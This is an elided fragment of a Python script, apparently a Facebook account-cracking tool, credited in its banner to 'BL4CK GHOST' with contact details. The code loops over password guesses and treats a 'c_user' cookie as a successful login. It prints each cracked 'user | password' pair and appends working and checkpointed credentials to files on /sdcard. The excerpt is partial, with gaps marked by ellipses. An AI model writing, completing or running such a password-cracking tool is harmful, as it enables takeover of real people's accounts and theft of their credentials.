...
==================================================
           CODED BY : BL4CK GHOST       
           WHATSAPP : +8801403360872    
           FB PAGE  : pompomLover   
==================================================           
...
def THEMOHSIN (OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;92m SUCCESSFULL : %s --- \033[1;97m/sdcard/M4HIN-OK.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;92m CHECKPOINTS : %s --- \033[1;97m/sdcard/M4HIN-Cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [M4HIN-OK] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/M4HIN-OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s \033[1;94m[M4HIN-Cp] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/M4HIN-Cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
